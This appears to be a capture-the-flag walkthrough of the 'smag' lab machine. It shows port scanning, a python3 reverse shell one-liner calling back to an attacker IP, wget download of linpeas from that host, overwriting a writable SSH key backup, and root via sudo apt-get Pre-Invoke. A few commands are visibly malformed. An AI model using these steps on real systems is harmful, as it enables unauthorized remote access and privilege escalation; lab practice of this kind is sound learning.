
We first do a nmap to scan the victim's ports:
```bash
┌──(javnievic㉿kali)-[~]
└─$ nmap -sV -Pn 10.10.17.193
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-10 14:26 EST
Nmap scan report for smag.thm (10.10.17.193)
Host is up (0.060s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.66 seconds
```

Gobuster for enumeration of directories
![[Screenshots/Pasted image 20251110203623.png]]


We access to the page
![[Screenshots/Pasted image 20251110203748.png]]


We download the pcap and observe the domain development.smag.thm and credentials:

![[Screenshots/Pasted image 20251110204022.png]]

Adding the domain to the hosts file
`echo "<Ip_victim> smag.thm development.smag.thm" | sudo tee -a /etc/hosts`

To delete the ip, if we restore the machine:
`sudo sed -i '/smag.thm/d; /development.smag.thm/d' /etc/hosts`  


```bash
nc -lvpn 4444
```


Reverse shell: 
[Online - Reverse Shell Generator](https://www.revshells.com/) -> python3

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.87.146",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

![[Screenshots/Pasted image 20251110204153.png]]

To kill the connection:
```bash
┌──(javnievic㉿kali)-[~]
└─$ ss -tnp | grep :4444                                                       
                                                                                                                                                                                                                                           
┌──(javnievic㉿kali)-[~]
└─$ sudo ss -K src 10.8.87.146 sport = :4444 dst <IP_victim> dport = :<port>
Netid                      State                      Recv-Q                      Send-Q                                            Local Address:Port                                             Peer Address:Port                       
tcp                        ESTAB                      0                           0                                                   10.8.87.146:4444                                             10.10.17.193:39596                      
        
```

![[Screenshots/Pasted image 20251110225714.png]]


Prettifying the shell
`python3 -c 'import pty,os,pty; pty.spawn("/bin/bash")'`

Install linpeas and creat a python server:
```bash
┌──(javnievic㉿kali)-[~/kali-lab/common-tools/Linux]
└─$ wget -O ~/linpeas.sh \

$ python3 -m http.server 8000
```

Intall linpeas in the victim's environment: 
```bash
wget http://10.8.87.146:8000/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh/tmp/linpeas.sh | tee /tmp/linpeas.out

cat linpeas.out | grep -i "cron"
cat linpeas.out | grep -i "suid"
cat linpeas.out | grep -i "sudo"
cat linpeas.out | grep -i "key"
```


![[Screenshots/Pasted image 20251110205911.png]]

We prove the permissions that we have in this backups file:
```bash
www-data@smag:/var/www/development.smag.thm$ ls -l /opt/.backups/
ls -l /opt/.backups/
total 4
-rw-rw-rw- 1 root root 563 Jun  5  2020 jake_id_rsa.pub.backup
```

We have to create a rsa key pair so we can write our public key into the jake's backup file
```bash
$ ssh-keygen -t rsa -b 4096 -f /tmp/jake_key -N "" -C "pwn"  
$ cp /opt/.backups/jake_id_rsa.pub.backup /tmp/jake_id_rsa.pub.backup.bak  
$ cat /tmp/jake_key.pub > /opt/.backups/jake_id_rsa.pub.backup
```


And finally we have access to the machine with ssh (-i to specify the key): 
`ssh -i /tmp/jake_key jake@<Victims_IP>`



We found that apt-get needs no passwd: 
```bash 
sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```


```bash 
jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# whoami
whoami
root
```